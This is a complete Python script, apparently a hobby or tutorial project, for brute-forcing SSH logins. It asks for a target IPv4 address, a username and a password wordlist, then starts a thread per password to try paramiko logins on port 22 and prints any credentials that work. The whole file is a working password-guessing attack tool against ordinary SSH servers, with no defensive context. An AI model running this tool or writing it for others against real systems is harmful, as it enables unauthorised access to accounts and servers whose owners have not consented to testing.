import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import colorama
from colorama import Fore, Back, Style

#Initialize colorama
colorama.init(autoreset=True)

# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # attempt to connect to the host, on port 22 which is ssh by default, with username that was entered earlier, with password file
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
        # If it didn't throw an exception, we know the credentials were successful
        print(f"{Fore.YELLOW}{Style.BRIGHT}\n*** FOUND ***\nUsername: {username}\nPassword: {password}\n")
    except AuthenticationException:
        print(f"Username: {username} Password: {password} is INCORRECT.")
    except ssh_exception.SSHException:
        print(f"{Fore.RED}*** rate limiting on server ***")


# This function gets a valid IP address from the user.
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
            print("Please enter a valid ip address.")


# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards, declare ssh_port inside a function.
    username = str(input("Please enter username to bruteforce: "))
    list_file = str(input("Please enter location of the password file: "))
    host = get_ip_address()


    with open(list_file, "r")as file:
        for line in file.readlines():
            passwd = line.strip()
            # create a thread on the ssh_connect function, and send the correct arguments to it.
            thread = threading.Thread(target=ssh_connect, args=(host, username, passwd))
            # starting the thread.
            thread.start()
            # leave a small time between starting a new connection thread.
            time.sleep(0.2)

# Run the main function where execution starts.
__main__()
